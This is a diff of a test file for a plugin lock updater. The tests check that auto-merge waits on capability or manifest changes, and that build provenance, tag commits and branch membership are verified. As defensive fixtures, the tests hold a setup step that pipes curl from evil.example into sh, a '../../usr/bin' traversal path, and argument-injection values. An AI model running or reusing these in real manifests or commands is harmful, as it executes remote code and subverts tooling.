@@ -5,12 +5,16 @@ import test from "node:test";
 
 import { describeManifest } from "./plugin-caps.mjs";
 import {
+  WORDS_ONLY_KEYS,
+  assertOnMain,
   attestationArgs,
   attestationIdentity,
   capabilityChange,
   capabilityLines,
   code,
   commandMessage,
+  ghEnv,
+  manifestBehaviour,
   manifestFields,
   md,
   newer,
@@ -22,6 +26,7 @@ import {
   pullRequest,
   resolveTagCommit,
   review,
+  sameBehaviour,
   setLockValues,
   toolArtifacts,
   verifyProvenance,
@@ -151,7 +156,7 @@ test("the pull request is a fix: (a patch release ships the new lock)", () => {
   const grown = pullRequest([{ ...bump("mycelium", "Mycelium", "0.2.0"), automerge: false, why: "its capability lines changed: it may ask for more" }]);
   assert.equal(grown.automerge, false, "asking for more waits for a person");
   assert.match(grown.body, /no auto-merge/);
-  assert.match(grown.body, /`mycelium` 0\.2\.0: its capability lines changed/);
+  assert.match(grown.body, /`mycelium` 0\.2\.0: ` its capability lines changed: it may ask for more `/);
 });
 
 test("capability lines: api and the tables that say what it can do, not the card's words", () => {
@@ -332,7 +337,7 @@ const PROVENANCE_AT = { workflow: ".github/workflows/release.yml", refs: ["refs/
 const VERIFIED = { ...PROVENANCE_AT, verified: true, why: null, ref: "refs/tags/v0.1.1" };
 const unverified = (why) => ({ ...PROVENANCE_AT, verified: false, why, ref: null });
 
-test("auto-merge needs the same tier, the approved digest, and provenance when privileged (the safeguard)", () => {
+test("auto-merge needs the same tier, the approved digest, the same manifest but its words, and provenance when privileged (the safeguard)", () => {
   const pinned = release("0.1.0");
   const reworded = release("0.1.1").replace("Notes for agents.", "Other words.");
   const grown = release("0.1.1", '[[programs]]\nname = "pandoc"');
@@ -352,11 +357,10 @@ test("auto-merge needs the same tier, the approved digest, and provenance when p
   assert.equal(review({ ...sandboxed, tier: "" }, pinned, reworded).automerge, false, "only the exact words sandboxed or privileged");
   assert.equal(review({ ...sandboxed, tier: "Sandboxed" }, pinned, reworded).automerge, false);
   assert.equal(review({ ...priv, tier: "Privileged" }, pinnedPriv, privSame, VERIFIED).automerge, false);
-  // The line comparison stays as a stricter extra: lines that differ only in
-  // a way the digest ignores (an inline comment) still wait.
-  const commented = pinned.replace('files = "read"', 'files = "read" # still read');
-  assert.equal(describeManifest(commented).caps, describeManifest(pinned).caps);
-  assert.deepEqual(review(sandboxed, pinned, commented), { automerge: false, why: "its capability lines changed" });
+  // The comparison is of the parsed manifest, not its text: formatting alone
+  // (an inline comment, another string quote) changes nothing.
+  const commented = pinned.replace('files = "read"', "files = 'read' # still read");
+  assert.deepEqual(review(sandboxed, pinned, commented), { automerge: true, why: null });
   // The pull request follows the bumps: one that waits holds back all.
   const ok = bumpOf(pinned, reworded);
   const waits = { ...bumpOf(pinned, grown), id: "other", to: "0.2.0" };
@@ -381,80 +385,193 @@ test("capability changes the line heuristic can't see never merge by themselves"
   const dottedTool = noProvides("0.1.1", '\nprovides.mcp_tools = ["evil"]');
   for (const [p, r] of [[pinned, topLevelProgram], [pinned, commentedHeader], [dottedPinned, dottedTool]]) {
     assert.deepEqual(capabilityLines(r), capabilityLines(p), "the line heuristic alone is blind to it");
+    assert.equal(sameBehaviour(p, r), false, "the structural comparison is not");
   }
-  assert.deepEqual(review(entryOf(pinned), pinned, topLevelProgram, VERIFIED), {
-    automerge: false,
-    why: "its tier changes (sandboxed → privileged); its capability digest is not the approved one: it may ask for more",
-  });
+  const tierAndMore = "its tier changes (sandboxed → privileged); its capability digest is not the approved one: it may ask for more; its manifest changes more than its words";
+  assert.deepEqual(review(entryOf(pinned), pinned, topLevelProgram, VERIFIED), { automerge: false, why: tierAndMore });
   assert.equal(describeManifest(topLevelProgram).tier, "privileged");
-  assert.deepEqual(review(entryOf(pinned), pinned, commentedHeader, VERIFIED), {
-    automerge: false,
-    why: "its tier changes (sandboxed → privileged); its capability digest is not the approved one: it may ask for more",
-  });
+  assert.deepEqual(review(entryOf(pinned), pinned, commentedHeader, VERIFIED), { automerge: false, why: tierAndMore });
   assert.equal(describeManifest(dottedTool).tier, "sandboxed");
   assert.deepEqual(review(entryOf(dottedPinned), dottedPinned, dottedTool, VERIFIED), {
     automerge: false,
-    why: "its capability digest is not the approved one: it may ask for more",
+    why: "its capability digest is not the approved one: it may ask for more; its manifest changes more than its words",
   });
-  // And the PR they open says so, and writes the release's own tier and caps.
+  // And the PR they open says so (the reason a literal code span), and
+  // writes the release's own tier and caps.
   const bump = bumpOf(pinned, topLevelProgram);
   assert.equal(bump.tier, "privileged");
   const { body, automerge } = pullRequest([bump]);
   assert.equal(automerge, false);
-  assert.match(body, /`notes` 0\.1\.1: its tier changes \(sandboxed → privileged\); its capability digest is not the approved one/);
+  assert.match(body, /`notes` 0\.1\.1: ` its tier changes \(sandboxed → privileged\); its capability digest is not the approved one/);
   assert.match(body, /- Tier: sandboxed → \*\*privileged\*\*/);
   assert.match(body, /Runs bash: this plugin can run any command on this host/);
+});
+
+/** A privileged plugin with a downloaded tool, like latex: what the digest
+ *  leaves out lives in its setup steps, version args, bin and unpack. */
+const withTool = (version, { setup = 'args = ["--version"]', programVersion = '["--version"]', bin = "bin", unpack = "tar.gz" } = {}) =>
+  release(
+    version,
+    [
+      "",
+      "[[programs]]",
+      'name = "tlmgr"',
+      `version = ${programVersion}`,
+      "",
+      "[[tools]]",
+      'id = "tinytex"',
+      'name = "TinyTeX"',
+      'version = "2026.09"',
+      'programs = ["tlmgr"]',
+      "",
+      "[[tools.artifacts]]",
+      'platform = "linux-x86_64"',
+      'url = "https://example.org/tinytex.tar.gz"',
+      `sha256 = "${"a".repeat(64)}"`,
+      "size = 1000",
+      `unpack = "${unpack}"`,
+      `bin = "${bin}"`,
+      "",
+      "[[tools.setup]]",
+      'program = "tlmgr"',
+      setup,
+    ].join("\n"),
+  );
+
+test("what the digest leaves out is compared too: setup steps, version args, bin, unpack — in every TOML form", () => {
+  const pinned = withTool("0.1.0");
+  const entry = entryOf(pinned);
+  assert.equal(entry.tier, "privileged");
+  const evilSetup = 'args = ["-e", "system(q{curl -s https://evil.example/x|sh})"]';
+  const variants = {
+    "tools.setup": withTool("0.1.1", { setup: evilSetup }),
+    "programs.version": withTool("0.1.1", { programVersion: '["-e", "system(q{x})"]' }),
+    bin: withTool("0.1.1", { bin: "../../usr/bin" }),
+    unpack: withTool("0.1.1", { unpack: "none" }),
+    // The reviewer's form: a second setup step after [release], under a
+    // header with a trailing comment.
+    "tools.setup, commented header": `${withTool("0.1.1")}\n[[tools.setup]] # appended\nprogram = "tlmgr"\n${evilSetup}\n`,
+    "tools.setup, inline table": withTool("0.1.1").replace(/\[\[tools\.setup\]\]\nprogram = "tlmgr"\nargs = \["--version"\]/, ""
+    ).replace('programs = ["tlmgr"]', `programs = ["tlmgr"]\nsetup = [{ program = "tlmgr", ${evilSetup} }]`),
+    "programs.version, dotted keys": withTool("0.1.1").replace(/\[\[programs\]\]\nname = "tlmgr"\nversion = \["--version"\]/, "[[programs]]\nname = \"tlmgr\"\nversion.0 = 1"),
+  };
+  for (const [what, next] of Object.entries(variants)) {
+    let readable = true;
+    try {
+      describeManifest(next);
+    } catch {
+      readable = false;
+    }
+    if (readable) {
+      assert.equal(describeManifest(next).tier, "privileged", what);
+      if (!what.startsWith("programs.version, dotted")) assert.equal(describeManifest(next).caps, entry.caps, `${what}: the digest doesn't see it`);
+    }
+    assert.equal(sameBehaviour(pinned, next), false, what);
+    const got = review(entry, pinned, next, VERIFIED);
+    assert.equal(got.automerge, false, what);
+    assert.match(got.why, /its manifest changes more than its words/, what);
+  }
+  // The same table written inline and as headers is the same manifest.
+  const inlineSame = withTool("0.1.1").replace(/\n\[\[tools\.setup\]\]\nprogram = "tlmgr"\nargs = \["--version"\]/, "").replace('programs = ["tlmgr"]', 'programs = ["tlmgr"]\nsetup = [{ program = "tlmgr", args = ["--version"] }]');
+  assert.equal(sameBehaviour(pinned, inlineSame), true);
+  assert.deepEqual(review(entry, pinned, inlineSame, VERIFIED), { automerge: true, why: null });
+  // Only the words differ: it may merge.
+  const words = withTool("0.1.1")
+    .replace("Notes for agents.", "Notes, for agents, now.")
+    .replace('name = "Notes"', 'name = "Notes Pro"')
+    .replace('agents = ["notes_read"]', 'agents = ["notes_read, said better"]')
+    .replace('api = "0.2"', 'api = "0.2"\ndescription = "Longer words."\nhomepage = "https://example.org"\ncategory = "writing"');
+  assert.equal(sameBehaviour(pinned, words), true);
+  assert.deepEqual(review(entry, pinned, words, VERIFIED), { automerge: true, why: null });
+  assert.equal(sameBehaviour(pinned, `${words}\n[recommends]\nsummary = "Why."\n`), true, "a summary is words");
+  assert.equal(sameBehaviour(pinned, `${words}\n[requires]\nchimaera = ">=9.0.0"\n`), false, "a requirement is not");
+  assert.equal(sameBehaviour(pinned, `${words}\n[detect]\nany = ["x"]\n`), false, "where it's active is not");
+  assert.equal(sameBehaviour(pinned, `${words}\nzz_unknown = 1\n`), false, "an unknown key is not");
+  assert.equal(sameBehaviour(pinned, "not toml ["), false, "an unreadable manifest is not");
+  assert.deepEqual(WORDS_ONLY_KEYS.map((k) => k.join(".")), [
+    "version",
+    "name",
+    "summary",
+    "description",
+    "homepage",
+    "category",
+    "adds",
+    "requires.summary",
+    "recommends.summary",
+  ]);
 });
 
 /** The commit a test release's tag points to, and another one. */
 const TAGGED = "1".repeat(40);
 const OTHER_COMMIT = "2".repeat(40);
 const ID = { repo: "o/notes", workflow: ".github/workflows/release.yml", refs: ["refs/tags/v0.1.1", "refs/heads/main"], commit: TAGGED };
+const WASM = "e".repeat(64);
+const TOML = "f".repeat(64);
+const DIGESTS = { wasm: WASM, toml: TOML };
 
-/** `gh attestation verify --format json` output for one attestation. */
-const ghResult = ({
+/** One attestation as `gh attestation verify --format json` prints it. */
+const attestation = ({
   repo = "o/notes",
   san = null,
   workflow = ".github/workflows/release.yml",
   ref = "refs/tags/v0.1.1",
   commit = TAGGED,
   runner = "github-hosted",
-  sha = "e".repeat(64),
-} = {}) =>
-  JSON.stringify([
-    {
-      attestation: {},
-      verificationResult: {
-        signature: {
-          certificate: {
-            subjectAlternativeName: san ?? `https://github.com/${repo}/${workflow}@${ref}`,
-            sourceRepositoryURI: `https://github.com/${repo}`,
-            sourceRepositoryRef: ref,
-            sourceRepositoryDigest: commit,
-            runnerEnvironment: runner,
-          },
-        },
-        statement: { subject: [{ name: "plugin.wasm", digest: { sha256: sha } }] },
+  issuer = "https://token.actions.githubusercontent.com",
+  predicate = "https://slsa.dev/provenance/v1",
+  subjects = [WASM, TOML],
+} = {}) => ({
+  attestation: {},
+  verificationResult: {
+    signature: {
+      certificate: {
+        subjectAlternativeName: san ?? `https://github.com/${repo}/${workflow}@${ref}`,
+        issuer,
+        sourceRepositoryURI: `https://github.com/${repo}`,
+        sourceRepositoryRef: ref,
+        sourceRepositoryDigest: commit,
+        runnerEnvironment: runner,
       },
     },
-  ]);
+    statement: { predicateType: predicate, subject: subjects.map((sha, n) => ({ name: `f${n}`, digest: { sha256: sha } })) },
+  },
+});
+const ghResult = (opts = {}) => JSON.stringify([attestation(opts)]);
 
-test("provenance: gh's result is checked again for the repository, workflow, ref, commit, runner and bytes", () => {
+test("provenance: gh's result is checked again — repository, signer, ref, issuer, commit, runner, predicate, both files", () => {
   assert.deepEqual(attestationIdentity("o/notes", "v0.1.1", TAGGED), ID);
   assert.throws(() => attestationIdentity("o/notes", "v0.1.1", "abc"), /not a commit/);
-  const sha = "e".repeat(64);
-  const at = (opts, ref = "refs/tags/v0.1.1") => provenanceFrom(ghResult({ ref, ...opts }), ID, sha, ref);
+  const at = (opts, ref = "refs/tags/v0.1.1") => provenanceFrom(ghResult({ ref, ...opts }), ID, DIGESTS, ref);
   assert.deepEqual(at({}), { verified: true, why: null }, "signed at the tag, from the tagged commit");
   assert.deepEqual(at({ ref: "refs/heads/main" }, "refs/heads/main"), { verified: true, why: null }, "run by hand on main, from the tagged commit");
   assert.deepEqual(at({ commit: OTHER_COMMIT }), { verified: false, why: "an attestation built from another commit than the tag's" });
-  assert.deepEqual(at({ ref: "refs/heads/main", commit: OTHER_COMMIT }, "refs/heads/main"), {
-    verified: false,
-    why: "an attestation built from another commit than the tag's",
-  });
   assert.deepEqual(at({ repo: "evil/notes" }), { verified: false, why: "an attestation from another repository" });
   assert.deepEqual(at({ repo: "xo/notes" }), { verified: false, why: "an attestation from another repository" }, "a repository with the same name suffix");
   assert.deepEqual(at({ runner: "self-hosted" }), { verified: false, why: "an attestation made on a self-hosted runner" });
-  assert.deepEqual(at({ sha: "0".repeat(64) }), { verified: false, why: "an attestation over other bytes" });
+  assert.deepEqual(at({ issuer: "https://evil.example" }), { verified: false, why: "an attestation not issued to GitHub Actions" });
+  assert.deepEqual(at({ predicate: "https://example.com/other/v1" }), { verified: false, why: "an attestation that is not SLSA build provenance" });
+  assert.deepEqual(at({ subjects: ["0".repeat(64), TOML] }), { verified: false, why: "an attestation over other bytes" });
+  // plugin.toml swapped after the run: the attestation names another toml.
+  assert.deepEqual(at({ subjects: [WASM, "9".repeat(64)] }), { verified: false, why: "no attestation covers this plugin.toml with this plugin.wasm" });
+  assert.deepEqual(at({ subjects: [WASM] }), { verified: false, why: "no attestation covers this plugin.toml with this plugin.wasm" });
+  // Two unrelated attestations, one over each file, never add up to one.
+  const split = JSON.stringify([attestation({ subjects: [WASM] }), attestation({ subjects: [TOML] })]);
+  assert.deepEqual(provenanceFrom(split, ID, DIGESTS, "refs/tags/v0.1.1"), {
+    verified: false,
+    why: "no attestation covers this plugin.toml with this plugin.wasm",
+  });
+  // An old run's wasm with a relabelled toml (a rollback under a new
+  // version): that run attested the old toml, not this one.
+  const oldRun = JSON.stringify([attestation({ subjects: [WASM, "8".repeat(64)], commit: OTHER_COMMIT })]);
+  assert.equal(provenanceFrom(oldRun, ID, DIGESTS, "refs/tags/v0.1.1").verified, false);
+  const oldRunSameCommit = JSON.stringify([attestation({ subjects: [WASM, "8".repeat(64)] })]);
+  assert.deepEqual(provenanceFrom(oldRunSameCommit, ID, DIGESTS, "refs/tags/v0.1.1"), {
+    verified: false,
+    why: "no attestation covers this plugin.toml with this plugin.wasm",
+  });
+  // One good attestation among others is enough; it alone carries everything.
+  const mixed = JSON.stringify([attestation({ subjects: [WASM] }), attestation({})]);
+  assert.deepEqual(provenanceFrom(mixed, ID, DIGESTS, "refs/tags/v0.1.1"), { verified: true, why: null });
   // Look-alike signers never pass for the expected one.
   const base = "https://github.com/o/notes/.github/workflows";
   for (const [san, why] of [
@@ -465,42 +582,79 @@ test("provenance: gh's result is checked again for the repository, workflow, ref
     [`${base}/release.yml@refs/tags/v0.1.1-x`, /another ref/],
     [`https://github.com/xo/notes/.github/workflows/release.yml@refs/tags/v0.1.1`, /another workflow/],
   ]) {
-    const got = provenanceFrom(ghResult({ san }), ID, sha, "refs/tags/v0.1.1");
+    const got = provenanceFrom(ghResult({ san }), ID, DIGESTS, "refs/tags/v0.1.1");
     assert.equal(got.verified, false, san);
     assert.match(got.why, why, san);
   }
-  // Only the two accepted refs are ever attempted.
-  assert.deepEqual(provenanceFrom(ghResult({ ref: "refs/heads/feature" }), ID, sha, "refs/heads/feature"), {
+  assert.deepEqual(provenanceFrom(ghResult({ ref: "refs/heads/feature" }), ID, DIGESTS, "refs/heads/feature"), {
     verified: false,
     why: "not an accepted ref: refs/heads/feature",
   });
-  assert.deepEqual(provenanceFrom("[]", ID, sha, "refs/tags/v0.1.1"), { verified: false, why: "no attestation" });
-  assert.deepEqual(provenanceFrom("not json", ID, sha, "refs/tags/v0.1.1"), { verified: false, why: "gh printed no verification result" });
+  assert.deepEqual(provenanceFrom("[]", ID, DIGESTS, "refs/tags/v0.1.1"), { verified: false, why: "no attestation" });
+  assert.deepEqual(provenanceFrom("not json", ID, DIGESTS, "refs/tags/v0.1.1"), { verified: false, why: "gh printed no verification result" });
 });
 
-test("the tag resolves to a commit through the API, an annotated tag dereferenced", async () => {
-  const api = (map) => async (path) => {
-    if (!(path in map)) throw Object.assign(new Error(`${path}: HTTP 404`), { status: 404 });
-    return map[path];
-  };
-  const ref = "/repos/o/notes/git/ref/tags/v0.1.1";
-  assert.equal(await resolveTagCommit("o/notes", "v0.1.1", api({ [ref]: { object: { type: "commit", sha: TAGGED } } })), TAGGED);
+/** A GitHub API stand-in: path → JSON (absent: 404). */
+const apiOf = (map) => async (path) => {
+  if (!(path in map)) throw Object.assign(new Error(`${path}: HTTP 404`), { status: 404 });
+  return map[path];
+};
+const TAG_REF = "/repos/o/notes/git/ref/tags/v0.1.1";
+const COMPARE = `/repos/o/notes/compare/${TAGGED}...main`;
+/** The API for a tag on `commit`, and main's compare answer for it. */
+const githubFor = (commit = TAGGED, compare = { status: "ahead", merge_base_commit: { sha: commit } }) =>
+  apiOf({
+    [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "commit", sha: commit } },
+    [`/repos/o/notes/compare/${commit}...main`]: compare,
+  });
+
+test("the tag resolves to a commit through the API, for exactly that tag, an annotated tag dereferenced", async () => {
+  assert.equal(await resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "commit", sha: TAGGED } } })), TAGGED);
   const annotated = "3".repeat(40);
   assert.equal(
     await resolveTagCommit(
       "o/notes",
       "v0.1.1",
-      api({ [ref]: { object: { type: "tag", sha: annotated } }, [`/repos/o/notes/git/tags/${annotated}`]: { object: { type: "commit", sha: TAGGED } } }),
+      apiOf({
+        [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "tag", sha: annotated } },
+        [`/repos/o/notes/git/tags/${annotated}`]: { object: { type: "commit", sha: TAGGED } },
+      }),
     ),
     TAGGED,
   );
-  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", api({})), /404/);
-  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", api({ [ref]: { object: { type: "tree", sha: TAGGED } } })), /does not resolve to a commit/);
-  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", api({ [ref]: { object: { type: "commit", sha: "abc" } } })), /does not resolve to a commit/);
-  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", api({ [ref]: { object: { type: "tag", sha: annotated } } })), /404/);
+  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({})), /404/);
+  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.10", object: { type: "commit", sha: TAGGED } } })), /another ref/);
+  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { object: { type: "commit", sha: TAGGED } } })), /another ref/);
+  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "tree", sha: TAGGED } } })), /does not resolve to a commit/);
+  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "commit", sha: "abc" } } })), /does not resolve to a commit/);
+  await assert.rejects(resolveTagCommit("o/notes", "v0.1.1", apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "tag", sha: annotated } } })), /404/);
 });
 
-/** A gh stand-in: answers per `--cert-identity` ref, records every call. */
+test("the tagged commit must be on main", async () => {
+  await assertOnMain("o/notes", TAGGED, apiOf({ [COMPARE]: { status: "ahead", merge_base_commit: { sha: TAGGED } } }));
+  await assertOnMain("o/notes", TAGGED, apiOf({ [COMPARE]: { status: "identical", merge_base_commit: { sha: TAGGED } } }));
+  for (const [what, answer, why] of [
+    ["a side commit", { status: "diverged", merge_base_commit: { sha: OTHER_COMMIT } }, /not on main \(compare: diverged\)/],
+    ["ahead of main", { status: "behind", merge_base_commit: { sha: OTHER_COMMIT } }, /compare: behind/],
+    ["no status", { merge_base_commit: { sha: TAGGED } }, /compare: no status/],
+    ["another merge base", { status: "ahead", merge_base_commit: { sha: OTHER_COMMIT } }, /another merge base/],
+    ["no merge base", { status: "ahead" }, /another merge base/],
+    ["an odd status", { status: "<b>x</b>", merge_base_commit: { sha: TAGGED } }, /not on main/],
+  ]) {
+    await assert.rejects(assertOnMain("o/notes", TAGGED, apiOf({ [COMPARE]: answer })), why, what);
+  }
+  await assert.rejects(assertOnMain("o/notes", TAGGED, apiOf({})), /404/, "a compare error");
+  let asked = false;
+  const never = async () => {
+    asked = true;
+    return {};
+  };
+  await assert.rejects(assertOnMain("o/notes/../x", TAGGED, never), /not a repository/);
+  await assert.rejects(assertOnMain("o/notes", "main", never), /not a commit/);
+  assert.equal(asked, false, "inputs are checked before any URL is built");
+});
+
+/** A gh stand-in: answers per `--source-ref`, records every call. */
 function fakeGh(answers) {
   const calls = [];
   const run = async (cmd, args, opts) => {
@@ -513,56 +667,53 @@ function fakeGh(answers) {
   };
   return { run, calls };
 }
-const resolvesTo = (commit) => async () => ({ object: { type: "commit", sha: commit } });
+const WASM_BYTES = Buffer.from("wasm");
+const TOML_BYTES = Buffer.from('id = "notes"\n');
+const sha = (b) => createHash("sha256").update(b).digest("hex");
+/** gh output for an attestation over this test's two files. */
+const ghFor = (opts = {}) => ghResult({ subjects: [sha(WASM_BYTES), sha(TOML_BYTES)], ...opts });
 
 test("provenance: every failure is a reason, never a throw; either accepted ref verifies", async () => {
   assert.equal(provenanceFailure({ code: "ENOENT" }), "gh is not installed");
   assert.equal(provenanceFailure({ stderr: "Error: HTTP 404: Not Found (https://api.github.com/repos/o/notes/attestations/sha256:ab)" }), "no attestation");
   assert.equal(provenanceFailure({ killed: true, signal: "SIGTERM", stderr: "" }), "gh attestation verify timed out");
   assert.equal(provenanceFailure({ stderr: "dial tcp: lookup api.github.com: no such host\nmore" }), "gh attestation verify failed: dial tcp: lookup api.github.com: no such host");
-  const bytes = Buffer.from("wasm");
-  const sha = createHash("sha256").update(bytes).digest("hex");
-  const opts = (run, commit = TAGGED) => ({ token: "tok", run, getJson: resolvesTo(commit) });
+  const verify = (gh, { commit = TAGGED, getJson = githubFor(commit), env = { PATH: "/bin", HOME: "/h", LOCK_TOKEN: "secret", GITHUB_TOKEN: "other" } } = {}) =>
+    verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1", { token: "tok", run: gh.run, getJson, env });
   const expect = (rest) => ({ workflow: ".github/workflows/release.yml", refs: ["refs/tags/v0.1.1", "refs/heads/main"], commit: TAGGED, ...rest });
 
-  // No attestation at either ref.
   let gh = fakeGh({});
-  assert.deepEqual(await verifyProvenance(bytes, "o/notes", "v0.1.1", opts(gh.run)), expect({ verified: false, why: "no attestation", ref: null }));
+  assert.deepEqual(await verify(gh), expect({ verified: false, why: "no attestation", ref: null }));
   assert.equal(gh.calls.length, 2, "both refs tried");
-  // gh missing.
   gh = fakeGh({ "refs/tags/v0.1.1": Object.assign(new Error("spawn gh ENOENT"), { code: "ENOENT" }), "refs/heads/main": Object.assign(new Error("spawn gh ENOENT"), { code: "ENOENT" }) });
-  assert.equal((await verifyProvenance(bytes, "o/notes", "v0.1.1", opts(gh.run))).why, "gh is not installed");
-  // Signed at the tag.
-  gh = fakeGh({ "refs/tags/v0.1.1": ghResult({ sha }) });
-  assert.deepEqual(await verifyProvenance(bytes, "o/notes", "v0.1.1", opts(gh.run)), expect({ verified: true, why: null, ref: "refs/tags/v0.1.1" }));
-  // Run by hand on main, from the tagged commit: verified at main.
-  gh = fakeGh({ "refs/heads/main": ghResult({ sha, ref: "refs/heads/main" }) });
-  assert.deepEqual(await verifyProvenance(bytes, "o/notes", "v0.1.1", opts(gh.run)), expect({ verified: true, why: null, ref: "refs/heads/main" }));
-  // On main from another commit than the tag's: waits, saying why.
-  gh = fakeGh({ "refs/heads/main": ghResult({ sha, ref: "refs/heads/main", commit: OTHER_COMMIT }) });
+  assert.equal((await verify(gh)).why, "gh is not installed");
+  gh = fakeGh({ "refs/tags/v0.1.1": ghFor() });
+  assert.deepEqual(await verify(gh), expect({ verified: true, why: null, ref: "refs/tags/v0.1.1" }));
+  gh = fakeGh({ "refs/heads/main": ghFor({ ref: "refs/heads/main" }) });
+  assert.deepEqual(await verify(gh), expect({ verified: true, why: null, ref: "refs/heads/main" }), "run by hand on main, from the tagged commit");
+  gh = fakeGh({ "refs/heads/main": ghFor({ ref: "refs/heads/main", commit: OTHER_COMMIT }) });
   assert.deepEqual(
-    await verifyProvenance(bytes, "o/notes", "v0.1.1", opts(gh.run)),
+    await verify(gh),
     expect({ verified: false, ref: null, why: "at refs/tags/v0.1.1: no attestation; at refs/heads/main: an attestation built from another commit than the tag's" }),
   );
-  // A tag that doesn't resolve never reaches gh.
-  gh = fakeGh({ "refs/tags/v0.1.1": ghResult({ sha }) });
-  const lost = await verifyProvenance(bytes, "o/notes", "v0.1.1", {
-    run: gh.run,
-    getJson: async () => {
-      throw new Error("HTTP 404");
-    },
-  });
+  // The toml it pins swapped for another: waits.
+  gh = fakeGh({ "refs/tags/v0.1.1": ghResult({ subjects: [sha(WASM_BYTES), sha(Buffer.from("other"))] }) });
+  assert.match((await verify(gh)).why, /no attestation covers this plugin\.toml with this plugin\.wasm/);
+  // A tag that doesn't resolve, or whose commit isn't on main, never reaches gh.
+  gh = fakeGh({ "refs/tags/v0.1.1": ghFor() });
+  const lost = await verify(gh, { getJson: apiOf({}) });
   assert.equal(lost.verified, false);
-  assert.match(lost.why, /^the tag's commit is unknown: HTTP 404/);
+  assert.match(lost.why, /^the tag's commit is unknown: .*HTTP 404/);
+  const offMain = await verify(gh, { getJson: githubFor(TAGGED, { status: "diverged", merge_base_commit: { sha: OTHER_COMMIT } }) });
+  assert.deepEqual(offMain, expect({ verified: false, ref: null, why: "the tagged commit is not on main (compare: diverged)", refs: ["refs/tags/v0.1.1", "refs/heads/main"] }));
   assert.equal(gh.calls.length, 0);
-  // The calls: gh, an argv array, no shell, the token only as GH_TOKEN.
+  // The calls: gh, an argv array, no shell, a minimal environment, the token only as GH_TOKEN.
   gh = fakeGh({});
-  await verifyProvenance(bytes, "o/notes", "v0.1.1", opts(gh.run));
+  await verify(gh);
   for (const call of gh.calls) {
     assert.equal(call.cmd, "gh");
     assert.equal(call.opts.shell, undefined, "never through a shell");
-    assert.equal(call.opts.env.GH_TOKEN, "tok");
-    assert.equal(call.opts.env.GITHUB_TOKEN, undefined);
+    assert.deepEqual(call.opts.env, { PATH: "/bin", HOME: "/h", GH_TOKEN: "tok" }, "no LOCK_TOKEN, no GITHUB_TOKEN");
   }
   assert.deepEqual(
     gh.calls.map((c) => c.args.slice(3)),
@@ -580,14 +731,15 @@ test("provenance: every failure is a reason, never a throw; either accepted ref 
       "json",
     ]),
   );
+  assert.deepEqual(ghEnv({ PATH: "/p", LOCK_TOKEN: "x", GITHUB_TOKEN: "y", GH_TOKEN: "z" }, ""), { PATH: "/p" });
   // A repository or tag outside the lock's grammar never reaches the API or gh.
   let asked = false;
   const never = async () => {
     asked = true;
     return { stdout: "" };
   };
-  assert.equal((await verifyProvenance(bytes, "o/notes --repo x", "v0.1.1", { run: never, getJson: never })).verified, false);
-  assert.equal((await verifyProvenance(bytes, "o/notes", "v0.1.1 --format=x", { run: never, getJson: never })).verified, false);
+  assert.equal((await verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes --repo x", "v0.1.1", { run: never, getJson: never })).verified, false);
+  assert.equal((await verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1 --format=x", { run: never, getJson: never })).verified, false);
   assert.equal(asked, false);
 });
 
@@ -635,13 +787,11 @@ test("each auto-merge condition, false in turn, holds the bump for a person", as
   assert.deepEqual(review(base, pinned, same), { automerge: true, why: null }, "sandboxed: all conditions hold");
   assert.deepEqual(review(priv, pinnedPriv, privSame, VERIFIED), { automerge: true, why: null }, "privileged: all conditions hold");
   // Provenance as verifyProvenance gives it, for each way a release is made.
-  const bytes = Buffer.from("wasm");
-  const sha = createHash("sha256").update(bytes).digest("hex");
-  const prov = (answers, commit = TAGGED) => verifyProvenance(bytes, "o/notes", "v0.1.1", { run: fakeGh(answers).run, getJson: resolvesTo(commit) });
-  const onMain = await prov({ "refs/heads/main": ghResult({ sha, ref: "refs/heads/main" }) });
+  const prov = (answers, { getJson = githubFor(TAGGED) } = {}) =>
+    verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1", { run: fakeGh(answers).run, getJson, env: {} });
+  const onMain = await prov({ "refs/heads/main": ghFor({ ref: "refs/heads/main" }) });
   assert.deepEqual(review(priv, pinnedPriv, privSame, onMain), { automerge: true, why: null }, "run by hand on main, from the tagged commit");
-  assert.deepEqual(review(priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghResult({ sha }) })), { automerge: true, why: null }, "tag push");
-  const id = attestationIdentity("o/notes", "v0.1.1", TAGGED);
+  assert.deepEqual(review(priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghFor() })), { automerge: true, why: null }, "tag push");
   const cases = [
     ["the lock's tier is another word", { ...base, tier: "sandboxed " }, pinned, same, VERIFIED, /neither sandboxed nor privileged/],
     ["the lock's caps were edited by hand", { ...base, caps: "0".repeat(64) }, pinned, same, VERIFIED, /the pinned release doesn't read as the tier and caps the lock records/],
@@ -653,19 +803,21 @@ test("each auto-merge condition, false in turn, holds the bump for a person", as
     ["the release's digest changed", base, pinned, release("0.1.1").replace('mcp_tools = ["notes_read"]', 'mcp_tools = ["notes_read", "x"]'), VERIFIED, /capability digest is not the approved one/],
     ["the release's digest shrank", base, pinned, release("0.1.1").replace('files = "read"', 'files = "none"'), VERIFIED, /capability digest is not the approved one/],
     ["a privileged release's digest changed", priv, pinnedPriv, privileged("0.1.1", '\nnetwork = "CTAN"'), VERIFIED, /capability digest is not the approved one/],
